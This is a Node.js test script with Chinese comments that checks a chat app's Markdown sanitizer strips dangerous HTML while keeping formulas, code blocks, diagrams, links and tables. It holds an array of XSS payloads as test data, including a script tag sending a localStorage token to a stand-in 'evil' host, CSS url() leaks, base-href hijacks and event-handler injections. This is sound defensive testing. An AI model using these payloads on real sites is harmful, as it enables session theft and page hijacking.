/**
 * 验证 safeMarkdown 的清洗效果。
 * 用与 MessageBubble 完全相同的插件链渲染真实攻击载荷，
 * 断言危险节点不会进入 DOM。
 *
 * 运行: node scripts/verify-sanitize.mjs   （在 frontend/ 下）
 */
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkMath from 'remark-math';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeKatex from 'rehype-katex';
import rehypeStringify from 'rehype-stringify';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

// ── 与 src/utils/safeMarkdown.ts 保持一致的 schema（此处内联以便独立运行） ──
const SAFE_CSS_PROPS = new Set([
  'height','min-height','max-height','width','min-width','max-width',
  'top','bottom','left','right','inset',
  'margin','margin-top','margin-right','margin-bottom','margin-left',
  'padding','padding-top','padding-right','padding-bottom','padding-left',
  'border','border-width','border-style','border-color',
  'border-top','border-right','border-bottom','border-left','border-radius',
  'font','font-size','font-weight','font-style','font-family',
  'line-height','letter-spacing','word-spacing',
  'text-align','text-indent','text-decoration','text-transform',
  'vertical-align','white-space','word-break','word-wrap','overflow-wrap',
  'display','position','overflow','overflow-x','overflow-y',
  'color','opacity','visibility','float','clear','direction',
  'list-style','list-style-type','box-sizing','flex','flex-direction',
  'align-items','justify-content','gap','transform',
]);
function isSafeStyleDeclaration(decl) {
  const t = decl.trim(); if (!t) return false;
  const c = t.indexOf(':'); if (c <= 0) return false;
  const prop = t.slice(0, c).trim().toLowerCase().replace(/^-(webkit|moz|ms|o)-/, '');
  if (!SAFE_CSS_PROPS.has(prop)) return false;
  const v = t.slice(c + 1).toLowerCase();
  if (v.includes('url(') || v.includes('expression') || v.includes('\\')) return false;
  return true;
}
function sanitizeStyleValue(v) {
  const kept = v.split(';').map(d => d.trim()).filter(d => d && isSafeStyleDeclaration(d));
  return kept.length ? kept.join('; ') : null;
}
function rehypeFilterStyle() {
  return (tree) => {
    const visit = (n) => {
      if (n.properties && typeof n.properties === 'object' && typeof n.properties.style === 'string') {
        const cleaned = sanitizeStyleValue(n.properties.style);
        if (cleaned === null) delete n.properties.style; else n.properties.style = cleaned;
      }
      if (Array.isArray(n.children)) for (const c of n.children) if (c && c.type === 'element') visit(c);
    };
    visit(tree);
  };
}
const base = defaultSchema.attributes ?? {};
const schema = {
  ...defaultSchema,
  attributes: {
    ...base,
    '*': [...(base['*'] ?? []), 'className', 'style', 'ariaHidden', 'ariaLabel', 'id', 'role'],
    span: [['className', /^(katex|mord|mbin|mrel|mopen|mclose|mpunct|minner|mop|mspace|base|strut|vlist|hljs|hljs-.*|math-.*|mermaid).*$/], 'style', 'ariaHidden'],
    code: [['className', /^(language-.*|hljs.*|math-.*)$/], 'style'],
    pre: [['className', /^(hljs.*|language-.*)$/], 'style'],
    div: [['className', /^(mermaid|katex-display|math-display|hljs.*)$/], 'style'],
    math: [['className', /^math-.*$/]],
    annotation: ['encoding'],
  },
  tagNames: [...(defaultSchema.tagNames ?? []),
    'math','semantics','annotation','mtext','mi','mo','mn','mrow','msup','msub',
    'msubsup','mfrac','msqrt','mroot','mover','munder','munderover','mtable',
    'mtr','mtd','mspace','mpadded','mphantom','menclose','mmultiscripts','mprescripts','none'],
  protocols: { ...defaultSchema.protocols, href: ['http','https','mailto'], src: ['http','https'] },
};

function render(md) {
  // 插件顺序与真实组件一致：
  //   remarkMath/remarkGfm -> remarkRehype -> rehypeRaw -> [本项目的 safe 链] -> rehypeKatex
  return unified()
    .use(remarkParse)
    .use(remarkMath)
    .use(remarkGfm)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw)
    .use(rehypeFilterStyle)
    .use(rehypeSanitize, schema)
    .use(rehypeKatex)
    .use(rehypeStringify)
    .processSync(md)
    .toString();
}

// ── 攻击载荷（前端审计实测可执行的那三种 + 常见变体） ──
const attacks = [
  ['iframe srcdoc 同源脚本', '<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>'],
  ['style 数据外带', '<style>body{background-image:url("http://evil.example/?x")}</style>'],
  ['meta refresh 跳转', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
  ['base href 劫持', '<base href="https://evil.example/">'],
  ['script 标签', '<script>fetch("http://evil/"+localStorage.easystudy_token)</script>'],
  ['onerror 事件属性', '<img src=x onerror="alert(1)">'],
  ['javascript: 链接', '<a href="javascript:alert(1)">click</a>'],
  ['svg onload', '<svg onload="alert(1)"></svg>'],
  ['object/embed', '<object data="http://evil/x"></object><embed src="http://evil/x">'],
  ['form 外发', '<form action="http://evil/"><input name="t"></form>'],
  ['style 含 url() 的内联属性', '<span style="background-image:url(http://evil/x)">t</span>'],
];

// ── 必须保留的正常渲染 ──
const keepers = [
  ['KaTeX 内联公式', '$E=mc^2$'],
  ['KaTeX 块级公式', '$$\n\\int_0^1 x^2 dx\n$$'],
  ['代码块高亮', '```python\nprint("hi")\n```'],
  ['mermaid 代码块', '```mermaid\ngraph TD;A-->B;\n```'],
  ['普通链接', '[ok](https://example.com)'],
  ['表格', '| a | b |\n|---|---|\n| 1 | 2 |'],
];

let fail = 0;
console.log('=== 攻击载荷（必须被清除） ===');
for (const [name, payload] of attacks) {
  const out = render(payload);
  const bad = /<iframe|<script|<style|<meta|<base|<object|<embed|<form|onerror=|onload=|javascript:/i.test(out);
  console.log(`${bad ? 'FAIL' : 'ok  '}  ${name}`);
  if (bad) { fail++; console.log('        -> ' + out.slice(0, 220)); }
}

console.log('\n=== 正常内容（必须保留） ===');
for (const [name, payload] of keepers) {
  const out = render(payload);
  let ok = true, why = '';
  if (name.includes('KaTeX')) { ok = /katex|math/.test(out); why = 'katex/math 节点丢失'; }
  if (name.includes('代码块')) { ok = /<pre|<code/.test(out); why = 'pre/code 丢失'; }
  if (name.includes('mermaid')) { ok = /language-mermaid|mermaid/.test(out); why = 'mermaid class 丢失'; }
  if (name.includes('链接')) { ok = /href="https:\/\/example\.com"/.test(out); why = '链接丢失'; }
  if (name.includes('表格')) { ok = /<table/.test(out); why = '表格丢失'; }
  console.log(`${ok ? 'ok  ' : 'FAIL'}  ${name}`);
  if (!ok) { fail++; console.log('        -> ' + why + ' | ' + out.slice(0, 200)); }
}

console.log(`\n=== 失败数: ${fail} ===`);
process.exit(fail === 0 ? 0 : 1);
